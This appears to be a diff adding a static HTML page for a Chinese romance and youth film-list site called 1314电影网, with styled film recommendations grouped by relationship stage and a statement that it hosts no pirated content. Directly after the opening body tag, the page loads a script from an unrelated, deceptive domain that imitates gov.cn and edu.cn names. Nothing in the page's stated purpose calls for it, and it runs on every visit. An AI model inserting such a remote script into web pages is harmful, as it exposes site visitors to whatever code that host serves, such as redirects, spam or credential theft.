@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>1314电影网 - 一生一世·爱情与青春片单</title>
+<meta name="description" content="1314电影网(1314dianyingwang-h5)以“一生一世”为名，整理爱情、青春、约会、婚姻与遗憾类电影片单，移动端自适应，必应收录友好。">
+<meta name="keywords" content="1314电影网, 1314dianyingwang-h5, 爱情电影, 青春片单, 约会电影, 一生一世, 婚姻电影">
+<meta name="author" content="1314电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://1314dianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --dusk:#2b1830;
+  --dusk2:#3c2238;
+  --rose:#e26d8a;
+  --rose-soft:#f7c9d6;
+  --gold:#e7b75f;
+  --paper:#fbf3f3;
+  --ink:#3a2630;
+  --muted:#9a7e88;
+  --line:rgba(226,109,138,.25);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Noto Sans CJK SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(120% 60% at 85% -10%, rgba(231,183,95,.18), transparent 55%),
+    radial-gradient(120% 70% at 0% 0%, rgba(226,109,138,.22), transparent 55%),
+    linear-gradient(180deg,var(--dusk),var(--dusk2) 55%,#241420 100%);
+  color:var(--paper);
+  line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 情书条 */
+.love-bar{
+  background:linear-gradient(90deg,var(--rose),var(--gold));
+  color:#3a1822;
+  text-align:center;font-size:11px;letter-spacing:3px;
+  padding:6px 10px;font-weight:700;
+}
+
+/* 头部 */
+.header{max-width:1120px;margin:0 auto;padding:30px 20px 16px;text-align:center}
+.heart-logo{
+  display:inline-flex;align-items:center;gap:14px;
+  padding:12px 24px;border-radius:40px;
+  background:rgba(255,255,255,.06);
+  border:1px solid var(--line);
+  backdrop-filter:blur(6px);
+}
+.heart-logo .h{font-size:34px}
+.heart-logo h1{font-size:28px;letter-spacing:4px;color:#fff}
+.heart-logo .en{font-family:Arial,sans-serif;font-size:11px;color:var(--rose-soft);letter-spacing:2px}
+.header p.slogan{margin-top:12px;color:var(--rose-soft);font-size:14px}
+
+/* 搜索 */
+.search-wrap{max-width:520px;margin:16px auto 0}
+.search-wrap form{display:flex;height:42px;border-radius:21px;overflow:hidden;border:1px solid var(--line);background:rgba(255,255,255,.08)}
+.search-wrap input{flex:1;border:none;outline:none;background:transparent;color:#fff;padding:0 18px;font-size:13px}
+.search-wrap input::placeholder{color:#d9b9c4}
+.search-wrap button{border:none;background:var(--rose);color:#3a1822;padding:0 20px;font-weight:700;cursor:pointer}
+
+/* 导航 */
+.nav{max-width:1120px;margin:18px auto 22px;padding:0 20px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:7px 16px;border:1px solid var(--line);border-radius:20px;font-size:13px;color:var(--rose-soft);background:rgba(255,255,255,.04)}
+.nav a:hover,.nav a.active{background:var(--rose);color:#3a1822;border-color:var(--rose);font-weight:700}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:0 20px 30px}
+
+/* 横幅：情书 */
+.letter{
+  position:relative;overflow:hidden;
+  background:linear-gradient(135deg,rgba(255,255,255,.08),rgba(255,255,255,.02));
+  border:1px solid var(--line);
+  border-left:6px solid var(--gold);
+  border-radius:16px;padding:28px 26px;margin-bottom:28px;
+}
+.letter::after{content:"💌";position:absolute;right:16px;bottom:-18px;font-size:130px;opacity:.12}
+.letter .kicker{font-family:Arial,sans-serif;font-size:12px;color:var(--gold);letter-spacing:3px}
+.letter h2{font-size:25px;margin:6px 0 8px;color:#fff}
+.letter p{color:#f0d7df;max-width:640px;font-size:14px}
+.letter .chips{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.letter .chips span{padding:4px 12px;border:1px solid var(--line);border-radius:20px;font-size:12px;color:var(--rose-soft)}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+.s-head .no{width:30px;height:30px;border-radius:50%;background:var(--rose);color:#3a1822;display:flex;align-items:center;justify-content:center;font-weight:800}
+.s-head h3{font-size:18px;color:#fff;letter-spacing:1px}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--gold);font-family:Arial,sans-serif}
+
+/* 栏目一：约会排片 */
+.date-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.date-card{
+  background:rgba(255,255,255,.05);
+  border:1px solid var(--line);
+  border-top:3px solid var(--rose);
+  border-radius:14px;padding:18px;transition:transform .25s;
+}
+.date-card:hover{transform:translateY(-4px)}
+.date-card .scene{font-size:12px;font-family:Arial,sans-serif;color:var(--gold)}
+.date-card h4{font-size:16px;margin:6px 0;color:#fff}
+.date-card .meta{font-size:12px;color:var(--rose-soft);font-family:Arial,sans-serif;margin-bottom:8px}
+.date-card p{font-size:13px;color:#ecd6dd}
+.date-card .mood{margin-top:10px;font-size:11px;color:var(--rose);border:1px solid var(--line);display:inline-block;padding:2px 10px;border-radius:12px}
+
+/* 栏目二：爱情阶段 */
+.stage-list{background:rgba(255,255,255,.04);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.stage-row{display:flex;align-items:center;gap:14px;padding:14px 16px;border-bottom:1px dashed var(--line)}
+.stage-row:last-child{border-bottom:none}
+.stage-ico{width:42px;height:42px;border-radius:50%;background:rgba(231,183,95,.12);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.stage-info{flex:1}
+.stage-info h4{font-size:15px;color:#fff}
+.stage-info p{font-size:11px;color:var(--rose-soft);font-family:Arial,sans-serif}
+.stage-tag{font-size:11px;color:var(--gold);border:1px solid var(--line);padding:3px 10px;border-radius:12px;white-space:nowrap}
+
+/* 栏目三：情书墙 横向 */
+.letter-scroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.letter-card{scroll-snap-align:start;flex:0 0 220px;background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.letter-top{height:80px;display:flex;align-items:center;justify-content:center;font-size:34px;background:linear-gradient(135deg,var(--rose),#b14d68);color:#fff}
+.letter-card:nth-child(2) .letter-top{background:linear-gradient(135deg,var(--gold),#b9892f)}
+.letter-card:nth-child(3) .letter-top{background:linear-gradient(135deg,#8a6fd6,#5b46a8)}
+.letter-card:nth-child(4) .letter-top{background:linear-gradient(135deg,#6fb0d6,#3f7aa8)}
+.letter-card:nth-child(5) .letter-top{background:linear-gradient(135deg,#7fc9a8,#3f8f6a)}
+.letter-body{padding:12px}
+.letter-body h4{font-size:14px;color:#fff;margin-bottom:4px}
+.letter-body p{font-size:11px;color:var(--rose-soft);line-height:1.5}
+
+/* 栏目四：关于 */
+.about{background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:14px;padding:24px;display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:38px}
+.about h3{font-size:17px;color:var(--gold);margin-bottom:6px}
+.about p{font-size:13px;color:#ecd6dd;max-width:660px}
+.about .url{margin-top:8px;font-family:Arial,sans-serif;font-size:12px;color:var(--rose-soft)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:1px solid var(--line);padding:26px 20px 38px;text-align:center;color:var(--rose-soft);font-size:12px;font-family:Arial,sans-serif}
+.footer a{color:var(--gold)}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{color:var(--rose-soft)}
+.footer .fn a:hover{color:#fff}
+
+@media(max-width:860px){.date-grid{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .heart-logo h1{font-size:22px}
+  .nav a{padding:6px 12px;font-size:12px}
+  .letter{padding:20px 16px}
+  .letter h2{font-size:20px}
+  .main{padding:0 16px 24px}
+  .date-grid{grid-template-columns:1fr}
+  .stage-row{flex-wrap:wrap;gap:10px}
+  .stage-tag{margin-left:0}
+  .letter-card{flex-basis:80%}
+  .about{padding:18px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="love-bar">💗 1314电影网 · 一生一世 · 爱情 / 青春 / 约会片单 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="heart-logo">
+    <div class="h">💗</div>
+    <div>
+      <h1>1314电影网</h1>
+      <div class="en">1314dianyingwang-h5 · 一生一世片单馆</div>
+    </div>
+  </div>
+  <p class="slogan">1314 = 一生一世。这里不放“爱情动作片”，只放让人想和某人一起看的爱片、青春片、遗憾片。</p>
+  <div class="search-wrap">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜 初恋 / 异地恋 / 婚后 / 错过 / 青春...">
+      <button type="submit">找片</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">首页</a>
+  <a href="#">初恋青春</a>
+  <a href="#">热恋约会</a>
+  <a href="#">异地相思</a>
+  <a href="#">婚姻之后</a>
+  <a href="#">错过与遗憾</a>
+  <a href="#">七夕/情人节</a>
+  <a href="#">关于1314</a>
+</nav>
+
+<div class="main">
+
+  <section class="letter">
+    <div class="kicker">LOVE LETTERS · 1314</div>
+    <h2>有些电影，是写给某个人看的</h2>
+    <p>1314电影网把“爱情片”拆成可约会、可独处、可复盘的类型：操场边的初恋、雨里的重逢、婚后的沉默、多年后那句“要是当初……”。单页片单站，内页用 # 占位，不提供盗版下载。</p>
+    <div class="chips">
+      <span>初恋</span><span>热恋</span><span>异地</span><span>婚后</span><span>错过</span><span>重逢</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="date">
+    <div class="s-head"><span class="no">01</span><h3>约会排片表</h3><a class="more" href="#">全部场次 #</a></div>
+    <div class="date-grid">
+      <article class="date-card">
+        <div class="scene">SCENE 01 · 操场/单车</div>
+        <h4>《蓝色大门》</h4>
+        <div class="meta">2002 · 台湾 · 青春初恋</div>
+        <p>游泳池、单车、十七岁。最适合两个人看完后一路不说话的那种片。</p>
+        <span class="mood"># 初恋 # 夏天</span>
+      </article>
+      <article class="date-card">
+        <div class="scene">SCENE 02 · 雨夜重逢</div>
+        <h4>《情书》</h4>
+        <div class="meta">1995 · 日本 · 暗恋/遗憾</div>
+        <p>小樽的雪、图书馆的窗帘、那句“你好吗”。一个人看会哭，两个人看会抱紧。</p>
+        <span class="mood"># 暗恋 # 遗憾</span>
+      </article>
+      <article class="date-card">
+        <div class="scene">SCENE 03 · 异国时差</div>
+        <h4>《爱在黎明破晓前》</h4>
+        <div class="meta">1995 · 美国/欧洲 · 一夜恋爱</div>
+        <p>维也纳火车站、长夜走路、下车前说“别留电话”。约会片的天花板。</p>
+        <span class="mood"># 异地 # 一夜</span>
+      </article>
+      <article class="date-card">
+        <div class="scene">SCENE 04 · 婚后厨房</div>
+        <h4>《婚姻故事》</h4>
+        <div class="meta">2019 · 美国 · 婚姻/分离</div>
+        <p>不是出轨爽片，是两个好人怎么把家聊散。适婚年龄必看。</p>
+        <span class="mood"># 婚姻 # 现实</span>
+      </article>
+      <article class="date-card">
+        <div class="scene">SCENE 05 · 海边夏天</div>
+        <h4>《海街日记》</h4>
+        <div class="meta">2015 · 日本 · 家庭/陪伴</div>
+        <p>梅子酒、海边、四姐妹。不吵不闹，却比任何告白都像“一生一世”。</p>
+        <span class="mood"># 陪伴 # 日常</span>
+      </article>
+      <article class="date-card">
+        <div class="scene">SCENE 06 · 多年以后</div>
+        <h4>《爱在日落黄昏时》</h4>
+        <div class="meta">2004 · 法国/美国 · 重逢</div>
+        <p>九年后再次见面，咖啡馆、塞纳河、没说完的话。给“要是当初”的人看。</p>
+        <span class="mood"># 重逢 # 时间</span>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="stages">
+    <div class="s-head"><span class="no">02</span><h3>爱情生命周期</h3><a class="more" href="#">完整阶段 #</a></div>
+    <div class="stage-list">
+      <div class="stage-row">
+        <div class="stage-ico">🌱</div>
+        <div class="stage-info"><h4>暗恋 / 初恋</h4><p>《情书》《那些年》《怦然心动》《我的少女时代》</p></div>
+        <div class="stage-tag">心跳阶段</div>
+      </div>
+      <div class="stage-row">
+        <div class="stage-ico">🔥</div>
+        <div class="stage-info"><h4>热恋 / 约会</h4><p>《爱在黎明破晓前》《时空恋旅人》《遇见你之前》</p></div>
+        <div class="stage-tag">上头阶段</div>
+      </div>
+      <div class="stage-row">
+        <div class="stage-ico">✈️</div>
+        <div class="stage-info"><h4>异地 / 时差</h4><p>《北京遇上西雅图》《再见爱人》(纪实质感)《暖暖内含光》</p></div>
+        <div class="stage-tag">忍耐阶段</div>
+      </div>
+      <div class="stage-row">
+        <div class="stage-ico">🍳</div>
+        <div class="stage-info"><h4>婚姻 / 同居</h4><p>《婚姻故事》《45周年》《饮食男女》《推手》</p></div>
+        <div class="stage-tag">生活阶段</div>
+      </div>
+      <div class="stage-row">
+        <div class="stage-ico">🕊️</div>
+        <div class="stage-info"><h4>错过 / 释怀</h4><p>《爱在日落黄昏时》《前度》《山河故人》《一一》</p></div>
+        <div class="stage-tag">成长阶段</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="letters">
+    <div class="s-head"><span class="no">03</span><h3>情书墙 · 主题抽屉</h3><a class="more" href="#">更多 #</a></div>
+    <div class="letter-scroll">
+      <div class="letter-card"><div class="letter-top">🌸</div><div class="letter-body"><h4>校园初恋</h4><p>《蓝色大门》《那些年》《怦然心动》《情书》</p></div></div>
+      <div class="letter-card"><div class="letter-top">🌙</div><div class="letter-body"><h4>一夜与长途</h4><p>《爱在》三部曲 / 《爱乐之城》</p></div></div>
+      <div class="letter-card"><div class="letter-top">💍</div><div class="letter-body"><h4>婚与谎</h4><p>《婚姻故事》《消失的爱人》《45周年》</p></div></div>
+      <div class="letter-card"><div class="letter-top">✉️</div><div class="letter-body"><h4>信与记忆</h4><p>《情书》《海街日记》《山河故人》</p></div></div>
+      <div class="letter-card"><div class="letter-top">🎆</div><div class="letter-body"><h4>节日特辑</h4><p>七夕 / 情人节 / 520 / 1314 约会片单</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">04</span><h3>关于 1314</h3></div>
+    <div class="about">
+      <div class="ico">💌</div>
+      <div>
+        <h3>1314 = 一生一世，不是“宅男电影网”</h3>
+        <p>1314电影网（1314dianyingwang-h5）只做爱情/青春/约会/婚姻/遗憾类片单。旧网络里“1314电影网”曾被用作盗版影视站别名，那种“爱情动作片+免费看”的包装我们不做；本站为单页静态、移动端自适应、内页 # 占位，不托管未授权视频。</p>
+        <div class="url">https://1314dianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 1314电影网 | 1314dianyingwang-h5</div>
+  <div>永久地址：<a href="https://1314dianyingwang-h5.github.io">https://1314dianyingwang-h5.github.io</a></div>
+  <div>本站为爱情/青春电影推荐与片单整理站，不提供盗版或软色情内容。</div>
+  <div class="fn">
+    <a href="#">首页</a><a href="#">初恋</a><a href="#">热恋</a><a href="#">异地</a><a href="#">婚后</a><a href="#">遗憾</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
